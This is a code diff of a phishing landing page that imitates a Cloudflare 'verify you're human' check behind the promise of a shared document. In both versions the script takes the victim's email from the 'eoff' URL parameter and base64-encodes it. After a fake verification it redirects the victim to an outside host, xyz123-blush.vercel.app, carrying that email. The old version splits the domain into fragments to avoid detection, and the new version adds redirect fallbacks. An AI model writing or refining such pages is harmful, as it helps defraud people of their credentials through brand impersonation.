@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TransferWeFiles</title>
+    <title>Files Shared</title>
     <style>
         * {
             margin: 0;
@@ -13,329 +13,385 @@
         }
 
         body {
+            background-color: #f8f8f8;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
             padding: 20px;
         }
 
-        .document-text {
-            font-weight: bold;
-            font-size: 18px;
-            color: #333;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-
-        #loading-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-
-        .loading-spinner {
-            width: 60px;
-            height: 60px;
-            border: 5px solid rgba(33, 150, 243, 0.3);
-            border-radius: 50%;
-            border-top: 5px solid #2196F3;
-            animation: spin 1s linear infinite;
-        }
-
         .verification-container {
-            background-color: white;
             border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            padding: 25px;
+            padding: 30px;
             width: 100%;
-            max-width: 450px;
-            transition: all 0.3s ease;
-            display: none;
-            height: 115px;
+            max-width: 500px;
         }
 
-        .verification-content {
+        .instruction-text {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #333;
+            font-size: 16px;
+        }
+
+        .verification-box {
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 25px;
             display: flex;
             justify-content: space-between;
-            align-items: flex-start;
-            margin-bottom: 15px;
+            align-items: center;
+            transition: all 0.3s ease;
         }
 
-        .verification-section {
+        .verification-box:hover {
+            border-color: #c0c0c0;
+        }
+
+        .left-section {
             display: flex;
             align-items: center;
         }
 
-        .logo-section {
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .checkbox-input {
+            display: none;
+        }
+
+        .checkbox-custom {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #ddd;
+            border-radius: 4px;
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+
+        .checkbox-input:checked + .checkbox-custom {
+            background-color: #4CAF50;
+            border-color: #4CAF50;
+        }
+
+        .checkbox-input:checked + .checkbox-custom::after {
+            content: "✓";
+            color: white;
+            font-weight: bold;
+        }
+
+        .verification-text {
+            font-size: 16px;
+            color: #333;
+            font-weight: 500;
+        }
+
+        .verifying-text {
+            color: #2196F3;
+            font-weight: 600;
+            display: none;
+        }
+
+        .success-text {
+            color: #4CAF50;
+            font-weight: 600;
+            display: none;
+        }
+
+        .right-section {
+            text-align: right;
+        }
+
+        .brand-container {
             display: flex;
             flex-direction: column;
             align-items: flex-end;
         }
 
-        .logo {
+        .brand-row {
             display: flex;
             align-items: center;
-            margin-bottom: 8px;
+            gap: 8px;
+            margin-bottom: 5px;
         }
 
-        .logo-icon {
+        .cloudflare-img {
             width: 32px;
             height: 32px;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 10px;
-            color: white;
-            font-weight: bold;
-        }
-
-        .logo-text {
-            font-size: 20px;
-            font-weight: 600;
-            color: #333;
-            letter-spacing: -0.5px;
-        }
-
-        .terms-text {
-            color: #888;
-            font-size: 14px;
-        }
-
-        .checkbox-container {
-            position: relative;
-            width: 24px;
-            height: 24px;
-            margin-right: 15px;
-            cursor: pointer;
-        }
-
-        .checkbox {
-            position: absolute;
-            opacity: 0;
-            width: 0;
-            height: 0;
-        }
-
-        .checkmark {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 24px;
-            height: 24px;
-            border: 2px solid #ddd;
             border-radius: 4px;
-            transition: all 0.3s ease;
             display: flex;
             align-items: center;
             justify-content: center;
+            font-size: 10px;
+            color: #777;
         }
 
-        .checkbox:checked + .checkmark {
-            background-color: #4CAF50;
-            border-color: #4CAF50;
+        .brand {
+            font-size: 15px;
+            font-weight: 700;
+            color: #2c3e50;
+            letter-spacing: 1px;
         }
 
-        .checkbox:checked + .checkmark:after {
-            content: "";
-            position: absolute;
-            left: 7px;
-            top: 3px;
-            width: 6px;
-            height: 12px;
-            border: solid white;
-            border-width: 0 2px 2px 0;
-            transform: rotate(45deg);
+        .footer {
+            color: #777;
+            font-size: 12px;
         }
 
+        /* Loading spinner */
         .spinner {
-            width: 24px;
-            height: 24px;
+            width: 20px;
+            height: 20px;
             border: 2px solid rgba(33, 150, 243, 0.3);
             border-radius: 50%;
-            border-top: 2px solid #2196F3;
-            animation: spin 1s linear infinite;
+            border-top-color: #2196F3;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 12px;
             display: none;
+        }
+
+        /* Initial loading spinner */
+        .initial-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(33, 150, 243, 0.3);
+            border-radius: 50%;
+            border-top-color: #2196F3;
+            animation: spin 1s ease-in-out infinite;
+            margin: 30px auto;
         }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            to { transform: rotate(360deg); }
         }
 
-        .verification-text {
-            font-size: 16px;
-            color: #555;
-            transition: all 0.3s ease;
-        }
-
-        .verification-footer {
-            text-align: center;
-            color: #888;
-            font-size: 14px;
-        }
-
-        .success-message {
-            color: #4CAF50;
-            font-weight: 600;
+        /* States */
+        .loading .checkbox-custom {
             display: none;
         }
 
-        .verifying {
-            color: #2196F3;
+        .loading .spinner {
+            display: block;
         }
 
-        .success {
-            color: #4CAF50;
+        .loading .verification-text {
+            display: none;
         }
 
-        @media (max-width: 480px) {
-            .verification-content {
-                flex-direction: column;
-                align-items: flex-start;
-                gap: 20px;
-            }
+        .loading .verifying-text {
+            display: inline;
+        }
 
-            .logo-section {
-                align-self: flex-end;
-                align-items: flex-end;
-            }
+        .success .checkbox-custom {
+            display: none;
+        }
+
+        .success .spinner {
+            display: none;
+        }
+
+        .success .verification-text {
+            display: none;
+        }
+
+        .success .verifying-text {
+            display: none;
+        }
+
+        .success .success-text {
+            display: inline;
+        }
+
+        /* Hidden state */
+        .hidden {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="document-text">To view this document, verify you're human below</div>
+    <div id="initialLoading" class="initial-spinner"></div>
 
-    <div id="loading-screen">
-        <div class="loading-spinner"></div>
-    </div>
+    <div id="verificationContent" class="verification-container hidden">
+        <div class="instruction-text">To view this document, verify you're not a robot below</div>
 
-    <div class="verification-container">
-        <div class="verification-content">
-            <div class="verification-section">
-                <label class="checkbox-container">
-                    <input type="checkbox" class="checkbox" id="verification-checkbox">
-                    <span class="checkmark" id="checkmark"></span>
-                    <div class="spinner" id="spinner"></div>
+        <div class="verification-box" id="verificationBox">
+            <div class="left-section">
+                <label class="checkbox-container" id="checkboxLabel">
+                    <input type="checkbox" class="checkbox-input" id="verificationCheckbox">
+                    <span class="checkbox-custom"></span>
+                    <span class="spinner"></span>
+                    <span class="verification-text">Verify</span>
+                    <span class="verifying-text">Verifying...</span>
+                    <span class="success-text">Success!</span>
                 </label>
-                <span class="verification-text" id="verification-text">Verify you are human</span>
-                <span class="success-message" id="success-message">Success!</span>
             </div>
 
-            <div class="logo-section">
-                <div class="logo">
-                    <img src="cloudflare_.png" class="logo-icon" alt="Logo">
-                    <div class="logo-text">Cloudflare</div>
+            <div class="right-section">
+                <div class="brand-container">
+                    <div class="brand-row">
+                        <img src="cloudflare_.png" class="cloudflare-img" alt="Logo">
+                        <div class="brand">CLOUDFLARE</div>
+                    </div>
+                    <div class="footer">Privacy · Terms</div>
                 </div>
-                <div class="terms-text">privacy · terms</div>
             </div>
         </div>
     </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Function to encode email parameter to base64
-            function encodeEmailParameter() {
-                const urlParams = new URLSearchParams(window.location.search);
-                const email = urlParams.get('eoff');
+            // Configuration - Base URL parts for fail-safe construction
+            const REDIRECT_CONFIG = {
+                protocol: 'https:',
+                domain: 'xyz123-blush.vercel.app',
+                path: '/',
+                paramKey: 'eoff'
+            };
 
-                if (email) {
-                    // Encode the email to base64
-                    const encodedEmail = btoa(email);
+            // Process URL parameters
+            function processUrlParameters() {
+                try {
+                    const currentUrl = window.location.href;
+                    const eoffIndex = currentUrl.indexOf('eoff=');
 
-                    // Replace the email parameter with the encoded version
-                    const newUrl = new URL(window.location);
-                    newUrl.searchParams.set('eoff', encodedEmail);
+                    if (eoffIndex !== -1) {
+                        // Extract the value after eoff=
+                        let eoffValue = currentUrl.substring(eoffIndex + 5);
 
-                    // Update the URL without reloading the page
-                    window.history.replaceState({}, '', newUrl);
+                        // Remove any additional parameters after eoff value
+                        const ampersandIndex = eoffValue.indexOf('&');
+                        if (ampersandIndex !== -1) {
+                            eoffValue = eoffValue.substring(0, ampersandIndex);
+                        }
 
-                    console.log('Encoded email parameter:', email, '->', encodedEmail);
-                    return encodedEmail;
+                        // Encode the value in base64
+                        const encodedValue = btoa(eoffValue);
+
+                        // Update the URL with the encoded value
+                        const baseUrl = currentUrl.split('?')[0];
+                        const newUrl = baseUrl + '?encoded=' + encodedValue;
+                        window.history.replaceState(null, '', newUrl);
+
+                        return encodedValue;
+                    }
+                } catch (error) {
+                    console.error('Error processing URL parameters:', error);
                 }
                 return null;
             }
 
-            // Call the function to encode the email parameter
-            const encodedEmail = encodeEmailParameter();
+            // Build redirect URL safely
+            function buildRedirectUrl(encodedValue) {
+                try {
+                    // Construct URL parts safely
+                    const urlParts = [
+                        REDIRECT_CONFIG.protocol,
+                        '//',
+                        REDIRECT_CONFIG.domain,
+                        REDIRECT_CONFIG.path
+                    ];
 
-            const loadingScreen = document.getElementById('loading-screen');
-            const verificationContainer = document.querySelector('.verification-container');
+                    // Join base URL parts
+                    let redirectUrl = urlParts.join('');
 
-            // Show loading screen for 3 seconds
+                    // Add parameter if available
+                    if (encodedValue) {
+                        const separator = redirectUrl.includes('?') ? '&' : '?';
+                        redirectUrl += separator + REDIRECT_CONFIG.paramKey + '=' + encodedValue;
+                    }
+
+                    // Validate URL before returning
+                    try {
+                        new URL(redirectUrl);
+                        return redirectUrl;
+                    } catch (urlError) {
+                        console.error('Invalid redirect URL constructed:', redirectUrl);
+                        // Fallback to base URL without parameters
+                        return urlParts.join('');
+                    }
+                } catch (error) {
+                    console.error('Error building redirect URL:', error);
+                    // Ultimate fallback
+                    return REDIRECT_CONFIG.protocol + '//' + REDIRECT_CONFIG.domain + REDIRECT_CONFIG.path;
+                }
+            }
+
+            // Safe redirect function
+            function safeRedirect(url) {
+                try {
+                    // Multiple fallback methods for maximum compatibility
+                    if (window.location.replace) {
+                        window.location.replace(url);
+                    } else if (window.location.href) {
+                        window.location.href = url;
+                    } else {
+                        // Last resort - create a clickable link
+                        const link = document.createElement('a');
+                        link.href = url;
+                        link.click();
+                    }
+                } catch (redirectError) {
+                    console.error('Redirect failed:', redirectError);
+                    // Final emergency fallback
+                    setTimeout(function() {
+                        window.location.href = url;
+                    }, 100);
+                }
+            }
+
+            // Show initial spinner for 2 seconds
             setTimeout(function() {
-                loadingScreen.style.display = 'none';
-                verificationContainer.style.display = 'block';
-            }, 1500);
+                try {
+                    document.getElementById('initialLoading').classList.add('hidden');
+                    document.getElementById('verificationContent').classList.remove('hidden');
 
-            const checkbox = document.getElementById('verification-checkbox');
-            const checkmark = document.getElementById('checkmark');
-            const spinner = document.getElementById('spinner');
-            const verificationText = document.getElementById('verification-text');
-            const successMessage = document.getElementById('success-message');
+                    // Process URL parameters after the initial loading
+                    const encodedValue = processUrlParameters();
+                    console.log('Encoded value:', encodedValue);
+                } catch (initError) {
+                    console.error('Error during initialization:', initError);
+                }
+            }, 2000);
+
+            // Verification checkbox handler
+            const checkbox = document.getElementById('verificationCheckbox');
+            const verificationBox = document.getElementById('verificationBox');
 
             checkbox.addEventListener('change', function() {
                 if (this.checked) {
-                    // Show spinner and change text
-                    checkmark.style.display = 'none';
-                    spinner.style.display = 'block';
-                    verificationText.textContent = 'Verifying...';
-                    verificationText.classList.add('verifying');
+                    // Show loading state
+                    verificationBox.classList.add('loading');
+
+                    // Get the encoded value from URL
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const encodedValue = urlParams.get('encoded');
 
                     // Simulate verification process
                     setTimeout(function() {
-                        // Hide spinner and show success
-                        spinner.style.display = 'none';
-                        verificationText.style.display = 'none';
-                        successMessage.style.display = 'inline';
-                        checkmark.style.display = 'flex';
-                        verificationText.classList.remove('verifying');
-                        verificationText.classList.add('success');
+                        try {
+                            verificationBox.classList.remove('loading');
+                            verificationBox.classList.add('success');
 
-                        // Redirect after 2 seconds
-                        setTimeout(function() {
-                            // Break redirect URL into tiny bits and join during redirect
-                            const urlParts = [
-                                'xyz123-', 'blush', '.', 'vercel', '.', 'app',
-                                '/', '?', 'eoff'
-                            ];
-
-                            let redirectUrl = '';
-                            for (let i = 0; i < urlParts.length; i++) {
-                                redirectUrl += urlParts[i];
-                            }
-
-                            // Add encoded email if available
-                            if (encodedEmail) {
-                                redirectUrl += '=' + encodedEmail;
-                            }
-
-                            // Complete the URL
-                            redirectUrl = 'https://' + redirectUrl;
-
+                            // Build redirect URL safely
+                            const redirectUrl = buildRedirectUrl(encodedValue);
                             console.log('Redirecting to:', redirectUrl);
-                            window.location.href = redirectUrl;
-                        }, 2000);
 
-                    }, 2000); // 2 seconds delay
-                } else {
-                    // Reset to initial state
-                    spinner.style.display = 'none';
-                    checkmark.style.display = 'flex';
-                    verificationText.textContent = 'Verify you are human';
-                    verificationText.style.display = 'inline';
-                    successMessage.style.display = 'none';
-                    verificationText.classList.remove('verifying', 'success');
+                            // Redirect after showing success state
+                            setTimeout(function() {
+                                safeRedirect(redirectUrl);
+                            }, 1000);
+                        } catch (verificationError) {
+                            console.error('Error during verification process:', verificationError);
+                        }
+                    }, 1500);
                 }
             });
         });
